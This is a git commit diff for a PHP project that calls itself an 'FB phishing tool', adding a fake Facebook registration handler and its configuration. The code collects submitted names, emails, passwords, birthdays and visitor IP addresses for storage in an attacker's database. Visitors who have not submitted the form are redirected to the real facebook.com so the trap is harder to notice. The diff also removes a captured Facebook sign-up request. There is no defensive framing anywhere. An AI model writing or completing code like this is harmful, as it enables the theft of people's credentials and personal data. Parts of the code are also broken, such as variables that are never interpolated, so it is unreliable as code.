4ffcaac6ea11305dfc1ee4cc6482881920333015
Jamie4224 <jamietrip@hotmail.nl>
2016-11-12 13:35:59 +0100

    Register form done

--- config.inc.php
+++ config.inc.php
@@ -1,17 +1,33 @@
 <?
 // This is the configuration of the FB phishing tool!
 // Here you should define all database connection settings and other stuff
+// ALL OPTIONS, EXCEPT DATABASE SETTINGS AND MESSAGES SHOULD BE SET WITH LOWERCASE LETTERS OR/AND NUMBERS
+
+
+// FbPhish settings
+
+// Config option 287:
+//  TRUE: Redirect to facebook.com when poeple come on the register.php but did not submitted the form
+//  FALSE: Do not redirect when poeple com on register.php but did not submitted the register form on index.ph
+//  HOME: Redirect to /index.php when poeple are on register.php but did not submitted the register form
+//  NOT TRUE OR FALSE: If this is not "true" the poeple will be redirected to the entered link(example: if you put in https://google.com in config_option_287 you  will be redirected to google when you get on register.php when you did not submitted the form!)
+$config_option__287 = "true";
+
 
 // Database settings
-$fbphish_sql_ip = "";
+$fbphish_sql_host = "";
 $fbphish_sql_user = "";
 $fbphish_sql_password = "";
 $fbphish_sql_db = "";
-$fbphish_sql_table_prefix = "fbphish_";
 
 
 // DO NOT TOUCH
 // Defining global functions
+function getIp() {
+	$ip = $_SERVER['REMOTE_ADDR'];
+	return $ip;
+}
+
 function getMetaIp() {
     $metaIp = $_SERVER['REMOTE_ADDR'];
  
@@ -22,9 +38,4 @@ function getMetaIp() {
     }
  
     return $metaIp;
-}
-
-function getIp() {
-	$ip = $_SERVER['REMOTE_ADDR'];
-	return $ip;
 }
--- register.php
+++ register.php
@@ -1,70 +1,162 @@
 <?php
 // Require...
 require('/config.inc.php');
-if($_GET['register'] != "true"){
-	header("Location: https://facebook.com/");
-	die();
-}
 
-// Set variables
-$reg_firstname = $_POST['firstname'];
-$reg_lastname = $_POST['lastname'];
-$reg_email = $_POST['reg_email__'];
-$reg_email_confirmation = $_POST['reg_email_confirmation__'];
-$reg_passwd = $_POST['reg_passwd__'];
-$reg_birthday_day = $_POST['birthday_day'];
-$reg_birthday_month = $_POST['reg_birthday_year'];
-$reg_sex = $_POST['sex'];
-$reg_locale = $_POST['locale'];
-$reg_user_ip = getIp();
-$reg_meta_user_ip = getMetaIp();
-$missing = array();
-
-if(empty($reg_firstname)){
-	$missing[] = "Firstname missing";
-}
-
-if(empty($reg_lastname)){
-	$missing[] = "Lastname missing";
-}
-
-function emptycheck($var){
-	if(!empty($var)){
-		return true;
+// Check if register form is NOT submitted
+if($_POST['submit'] != "true"){
+	// If register form is not submitted redirect to real facebook page
+	if($config_option__287 == "true"){
+		header("Location: https://facebook.com/");
+		// Die() the page loading
+		die();
+	}elseif($config_option__287 == "false"){
+		// Die() the page loading
+		die();
+	}elseif($config_option__287 == "home"){
+		header("Location: /index.php");
+		// Die() the page loading
+		die();
+	}else{
+		header('Location: $config_option__287');
+		// Die() the page loading
+		die();
 	}
 }
 
-// TODO: Insert rest variable empty checks
 
-if(!empty($missing)){
-	$complete = "false";
-}else{
-	$complete = "true";
+// Check if register form is submitted
+if(isset($_POST['submit'])){
+	// Set variables
+	$reg_user_ip = getIp();
+	$reg_meta_user_ip = getMetaIp();
+	$missing = array();
+
+	// Check if variable is empty
+	if(empty($_POST['firstname'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Firstname missing";
+	}else{
+		// Else set the variable
+		$reg_firstname = $_POST['firstname'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['lastname'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Lastname missing";
+	}else{
+		// Else set the variable
+		$reg_lastname = $_POST['lastname'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['reg_email__'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Email missing";
+	}else{
+		// Else set the variable
+		$reg_email = $_POST['reg_email__'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['reg_email_confirmation__'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Email-confirmation missing";
+	}else{
+		// Else set the variable
+		$reg_email_confirmation = $_POST['reg_email_confirmation__'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['reg_passwd__'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Password missing";
+	}else{
+		// Else set the variable
+		$reg_passwd = $_POST['reg_passwd__'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['reg_birthday_day'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Birthday-day missing";
+	}else{
+		// Else set the variable
+		$reg_birthday_day = $_POST['reg_birthday_day'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['reg_birthday_month'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Birthday-month missing";
+	}else{
+		// Else set the variable
+		$reg_birthday_month = $_POST['reg_birthday_month'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['reg_birthday_year'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Birthday-year missing";
+	}else{
+		// Else set the variable
+		$reg_birthday_year = $_POST['reg_birthday_year'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['reg_sex'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "Sex missing";
+	}else{
+		// Else set the variable
+		$reg_sex = $_POST['reg_sex'];
+	}
+
+	// Check if variable is empty
+	if(empty($_POST['reg_locale'])){
+		// If empty then put message in the array() "missing"
+		$missing[] = "reg_locale missing";
+	}else{
+		// Else set the variable
+		$reg_locale = $_POST['reg_locale'];
+	}
+
+	// Check if there are any missing(s) variables
+	if(!empty($missing)){
+		// If there are any missing(s) then make the "complete" false
+		$complete = "false";
+	}else{
+		// If there are any missing(s) then make the "complete" true
+		$complete = "true";
+	}
+
+
+	// DATABASE CONNECT AND INSERT
+
+
+
+
+
+	try{
+	    $fbphish_database_conn = new PDO('mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db', $fbphish_sql_user, $fbphish_sql_password);
+	    // set the PDO error mode to exception
+	    $fbphish_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+		echo "Connected successfully"; 
+	}catch(PDOException $fbphish_database_conn_err){
+	    echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
+	}
+
+
+
+
+
+
+	// If complete is "true" execute code/sql
+	if($complete == "true"){
+		// EXECUTE PHP HERE
+	}elseif($complete == "false"){
+		// EXECUTE PHP HERE
+	}
 }
 
 
-http://localhost/register.php?
-lsd=AVoen1BA&
-firstname=voornaampiemn&
-lastname=achternaampiemn&
-reg_email__=MienEMAIL%40emailfirst.nl&
-reg_email_confirmation__=MienEMAIL%40emailconfirm.nl&
-reg_passwd__=Th1%241s%5EMyPassword&
-birthday_day=6&
-birthday_month=10&
-birthday_year=1997&
-sex=2&w
-ebsubmit=&
-referrer=&
-asked_to_login=0&
-terms=on&
-ab_test_data=AGAMlf4%2FSsfllZSGGMGMSMGGAAAAMGGSGGAAAAAGDQu%2F2VKAAAuDCj&
-contactpoint_label=email_or_phone&
-locale=nl_NL&
-reg_instance=UMcWVX2AX7h7jueo22lU9qCo&
-captcha_persist_data=AZkxVum1WAUrKrrdzPzOLgSzJc3lDrFaEZXP4aKFp0kvaJCTVVAkEi-56cfIqvtaaDZlPP8JVAO9U8SziqoN--9G90KfGMI2Goz2ujBSWKq5RywvIGq1oxtWsb6LyGrTyr_rcoPe7P_X31bk4GxlC4cHcTv8pGIkcjBIdAb52U0SVcg005kS51X86FoggBUtOlLJwbG3ToDneMB-0ehePrz7vpW3AO8AIa0PZlC8IflEy003fqX-O21rbTKCX6mTzqiZd64S9OR1dXrSM_Ugtf7BtRmMHXcn7rLu4lqxRea__hsfv2LHl_XvTJ1yEI1zuDl-m-wFlQzF4pQ6VQTu3eaPV8c2JTSl9QFgV1pr0IolDknVxobuvzUfl0DrIrpzGCg&
-captcha_session=-Ltzw4XyxHP9EKhBS_WptA&
-extra_challenge_params=authp%3Dnonce.tt.time.new_audio_default%26psig%3DKAJmVKyeqXRLo9FgsNQFsaRMffw%26nonce%3D-Ltzw4XyxHP9EKhBS_WptA%26tt%3DC95W8t6agDBMTSjM0a-i02RdS_8%26time%3D1477735292%26new_audio_default%3D1&
-recaptcha_type=password&
-captcha_response=&
-qsstamp=W1tbMjMsMzksNTQsNjUsNzksODIsOTksMTEyLDExNywxNDUsMTUzLDE3MSwxODcsMTk5LDIxMCwyNDEsMjQ1LDI2NywyNjksMjcyLDI3NSwzMDYsMzEyLDMxNiwzMTcsMzE4LDMyMCwzNDksMzc1LDM3NywzODYsMzg3LDQwOCw0MTcsNDIwLDQyNiw0MzEsNDMyLDQ3Miw0ODksNjQwLDcxM11dLCJBWm0yY1VaNXRyeUowUmRVLU9GWkJDSUJtRG9FWl9mUk16cnVaTm1wOGh1MEMybTdGWUl0ZVF5U001c3p4b1paS0ZVOFJ3cUVrYUlXSEhIQzZQR3F1M3g3M0pBUHpfNUxpLXd4eXRGWVllU1Nwb2NkdXVNdnZjVS05OXNoUHRzcHFaZHRvUElHQko4b2oyR0lYWXp0eGxyQmhybG1GWXBBVzRodXhOTHA0bmp3RTZTNHdyUHhLSXUzRjU4a0Zyd1pyTXRFZzNjTWZXZEdGQkVsZ29NMmpua2YiXQ%3D%3D
